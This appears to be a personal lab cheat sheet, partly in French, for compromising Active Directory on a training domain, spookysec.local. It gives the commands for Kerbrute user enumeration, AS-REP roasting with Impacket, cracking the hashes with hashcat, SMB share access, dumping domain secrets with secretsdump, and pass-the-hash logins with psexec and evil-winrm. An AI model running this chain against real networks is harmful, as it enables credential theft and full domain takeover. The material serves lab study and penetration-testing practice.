KERBEROS / ACTIVE DIRECTORY

OUTILS 
	SUITE IMPACKET :
		ASREProasting : ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set
			python3 /opt/impacket/examples/GetNPUsers.py
			
		
	BLOODHOUND 
	NEO4J
		apt install bloodhound neo4j
	ENUM4LINUX
		you know it my boyy
	KERBRUTE
		A tool to perform Kerberos pre-auth bruteforcing 
		https://github.com/ropnop/kerbrute
	SMBCLIENT
		

	
ENUM FOR NETBIOS DOMAIN NAME
	use enum4linux
	
SET DNS_DOMAIN_NAME (FOUND WITH NMAP -A) IN /ETC/HOSTS

ENUM FOR USERS VIA KERBEROS
	└─$ kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt
	spookysec.local is the DNS_Domain_Name (found with nmap -A)
	userlist.txt is a list of usernames

RETRIEVING KERBEROS TICKETS
	ASReproasting occurs when a user account has the privilege 
	"Does not require Pre-Authentication" set
	But i don't actually know how to find the privilege status
	└─$ python3 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.68.12 spookysec.local/svc-admin -no-pass
		- svc-admin in a valid username found previously
		- spookysec.local is the DNS_Domain_Name (found with nmap -A)
		
CRACK THE HASH
	The one i got in thise case was : Kerberos 5 AS-REP etype 23
	└─$ hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt --force 

ENUM SHARES WITH SMBCLIENT
	└─$ smbclient -L 10.10.72.208 --user svc-admin
	
LOG INTO SHARES WITH SMBCLIENT
	└─$ smbclient \\\\spookysec.local\\backup --user svc-admin
	- spookysec.local can also be the IP address
	- admin is a valid user and we have his password

ENUM FOR ADDITIONNAL INFORMATIONS WITH secretdump.py
	(Admit that we have password for the user backup)
	└─$ secretsdump.py -just-dc backup@spookysec.local
	
LOG IN WITH PSEXEC BY "PASSING THE HASH"
	└─$ psexec.py -hashes PUT_THE:HASH_HERE administrator@spookysec.local
	get cmd

LOG IN WITH EVIL-WINRM BY "PASSING THE HASH"
	└─$ evil-winrm -u administrator -H PUT_THE_HASH_HERE -i spookysec.local
	/!\ This only needs the second part of the NTLM hash
	get powershell
	
